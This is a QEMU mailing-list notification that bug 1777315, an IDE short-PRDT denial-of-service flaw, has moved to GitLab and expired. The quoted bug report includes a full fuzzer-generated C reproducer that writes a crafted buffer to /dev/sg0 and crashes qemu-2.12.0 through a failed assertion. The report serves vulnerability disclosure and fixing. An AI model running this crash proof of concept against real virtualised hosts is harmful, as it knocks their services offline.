Return-Path: <qemu-devel-bounces+lists+qemu-devel=lfdr.de@nongnu.org>
X-Original-To: lists+qemu-devel@lfdr.de
Delivered-To: lists+qemu-devel@lfdr.de
Received: from lists.gnu.org (lists.gnu.org [209.51.188.17])
	by mail.lfdr.de (Postfix) with ESMTPS id C709836FF7E
	for <lists+qemu-devel@lfdr.de>; Fri, 30 Apr 2021 19:27:47 +0200 (CEST)
Received: from localhost ([::1]:54170 helo=lists1p.gnu.org)
	by lists.gnu.org with esmtp (Exim 4.90_1)
	(envelope-from <qemu-devel-bounces+lists+qemu-devel=lfdr.de@nongnu.org>)
	id 1lcWva-0007em-Oi
	for lists+qemu-devel@lfdr.de; Fri, 30 Apr 2021 13:27:46 -0400
Received: from eggs.gnu.org ([2001:470:142:3::10]:38334)
 by lists.gnu.org with esmtps (TLS1.2:ECDHE_RSA_AES_256_GCM_SHA384:256)
 (Exim 4.90_1) (envelope-from <bounces@canonical.com>)
 id 1lcWaD-0003mr-6X
 for qemu-devel@nongnu.org; Fri, 30 Apr 2021 13:05:41 -0400
Received: from indium.canonical.com ([91.189.90.7]:51372)
 by eggs.gnu.org with esmtps (TLS1.2:ECDHE_RSA_AES_128_GCM_SHA256:128)
 (Exim 4.90_1) (envelope-from <bounces@canonical.com>)
 id 1lcWaB-0003Lu-5W
 for qemu-devel@nongnu.org; Fri, 30 Apr 2021 13:05:40 -0400
Received: from loganberry.canonical.com ([91.189.90.37])
 by indium.canonical.com with esmtp (Exim 4.86_2 #2 (Debian))
 id 1lcWa9-0008Cd-PV
 for <qemu-devel@nongnu.org>; Fri, 30 Apr 2021 17:05:37 +0000
Received: from loganberry.canonical.com (localhost [127.0.0.1])
 by loganberry.canonical.com (Postfix) with ESMTP id B6FDF2E815A
 for <qemu-devel@nongnu.org>; Fri, 30 Apr 2021 17:05:37 +0000 (UTC)
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable
Date: Fri, 30 Apr 2021 16:57:15 -0000
From: Thomas Huth <1777315@bugs.launchpad.net>
To: qemu-devel@nongnu.org
X-Launchpad-Notification-Type: bug
X-Launchpad-Bug: product=qemu; status=Expired; importance=Undecided;
 assignee=None; 
X-Launchpad-Bug-Information-Type: Public Security
X-Launchpad-Bug-Private: no
X-Launchpad-Bug-Security-Vulnerability: yes
X-Launchpad-Bug-Commenters: a1xndr asurati icytxw melver th-huth
X-Launchpad-Bug-Reporter: icytxw (icytxw)
X-Launchpad-Bug-Modifier: Thomas Huth (th-huth)
References: <152923423559.26799.9467570390321302567.malonedeb@gac.canonical.com>
Message-Id: <161980183568.3730.10330293184579320932.malone@chaenomeles.canonical.com>
Subject: [Bug 1777315] Re: IDE short PRDT abort
X-Launchpad-Message-Rationale: Subscriber (QEMU) @qemu-devel-ml
X-Launchpad-Message-For: qemu-devel-ml
Precedence: bulk
X-Generated-By: Launchpad (canonical.com);
 Revision="02afa4875ac52c169f5cddf0d1bcdd6e149a3754"; Instance="production"
X-Launchpad-Hash: 8ce5c7372dce5221436fdcd19ff9dff815aef93d
Received-SPF: none client-ip=91.189.90.7; envelope-from=bounces@canonical.com;
 helo=indium.canonical.com
X-Spam_score_int: -65
X-Spam_score: -6.6
X-Spam_bar: ------
X-Spam_report: (-6.6 / 5.0 requ) BAYES_00=-1.9,
 HEADER_FROM_DIFFERENT_DOMAINS=0.25, RCVD_IN_DNSWL_HI=-5,
 RCVD_IN_MSPIKE_H3=0.001, RCVD_IN_MSPIKE_WL=0.001, SPF_HELO_NONE=0.001,
 SPF_NONE=0.001 autolearn=ham autolearn_force=no
X-Spam_action: no action
X-BeenThere: qemu-devel@nongnu.org
X-Mailman-Version: 2.1.23
List-Id: <qemu-devel.nongnu.org>
List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
List-Archive: <https://lists.nongnu.org/archive/html/qemu-devel>
List-Post: <mailto:qemu-devel@nongnu.org>
List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
 <mailto:qemu-devel-request@nongnu.org?subject=subscribe>
Reply-To: Bug 1777315 <1777315@bugs.launchpad.net>
Errors-To: qemu-devel-bounces+lists+qemu-devel=lfdr.de@nongnu.org
Sender: "Qemu-devel" <qemu-devel-bounces+lists+qemu-devel=lfdr.de@nongnu.org>

This is an automated cleanup. This bug report has been moved
to QEMU's new bug tracker on gitlab.com and thus gets marked
as 'expired' now. Please continue with the discussion here:

 https://gitlab.com/qemu-project/qemu/-/issues/57


** Changed in: qemu
       Status: In Progress =3D> Expired

** Changed in: qemu
     Assignee: John Snow (jnsnow) =3D> (unassigned)

** Bug watch added: gitlab.com/qemu-project/qemu/-/issues #57
   https://gitlab.com/qemu-project/qemu/-/issues/57

-- =

You received this bug notification because you are a member of qemu-
devel-ml, which is subscribed to QEMU.
https://bugs.launchpad.net/bugs/1777315

Title:
  IDE short PRDT abort

Status in QEMU:
  Expired

Bug description:
  Hi,
  QEMU 'hw/ide/core.c:871' Denial of Service Vulnerability in version qemu-=
2.12.0

  run the program in qemu-2.12.0:
  #define _GNU_SOURCE =

  #include <endian.h>
  #include <sys/syscall.h>
  #include <unistd.h>
  #include <fcntl.h>
  #include <stdio.h>
  #include <string.h>
  #include <sys/stat.h>
  #include <stdint.h>
  #include <string.h>

  static uintptr_t syz_open_dev(uintptr_t a0, uintptr_t a1, uintptr_t a2)
  {
          if (a0 =3D=3D 0xc || a0 =3D=3D 0xb) {
                  char buf[128];
                  sprintf(buf, "/dev/%s/%d:%d", a0 =3D=3D 0xc ? "char" : "b=
lock", (uint8_t)a1, (uint8_t)a2);
                  return open(buf, O_RDWR, 0);
          } else {
                  char buf[1024];
                  char* hash;
  strncpy(buf, (char*)a0, sizeof(buf) - 1);
                  buf[sizeof(buf) - 1] =3D 0;
                  while ((hash =3D strchr(buf, '#'))) {
                          *hash =3D '0' + (char)(a1 % 10);
                          a1 /=3D 10;
                  }
                  return open(buf, a2, 0);
          }
  }

  uint64_t r[2] =3D {0xffffffffffffffff, 0xffffffffffffffff};
  void loop()
  {
          long res =3D 0;
  memcpy((void*)0x20000000, "/dev/sg#", 9);
          res =3D syz_open_dev(0x20000000, 0, 2);
          if (res !=3D -1)
                  r[0] =3D res;
          res =3D syscall(__NR_dup2, r[0], r[0]);
          if (res !=3D -1)
                  r[1] =3D res;
  *(uint8_t*)0x20000ec0 =3D 0;
  *(uint8_t*)0x20000ec1 =3D 0;
  *(uint8_t*)0x20000ec2 =3D 0;
  *(uint8_t*)0x20000ec3 =3D 0;
  *(uint32_t*)0x20000ec8 =3D 0;
  *(uint8_t*)0x20000ed8 =3D 0;
  *(uint8_t*)0x20000ed9 =3D 0;
  *(uint8_t*)0x20000eda =3D 0;
  *(uint8_t*)0x20000edb =3D 0;
  memcpy((void*)0x20000ee0, "\x9c\x4d\xe7\xd5\x0a\x62\x43\xa7\x77\x53\x67\x=
b3", 12);
          syscall(__NR_write, r[1], 0x20000ec0, 0x323);
  }

  int main()
  {
          syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
          loop();
          return 0;
  }
  this will crash qemu, output information:
   qemu-system-x86_64: hw/ide/core.c:843: ide_dma_cb: Assertion `n * 512 =
=3D=3D s->sg.size' failed.

  =

  Thanks =

  owl337

To manage notifications about this bug go to:
https://bugs.launchpad.net/qemu/+bug/1777315/+subscriptions

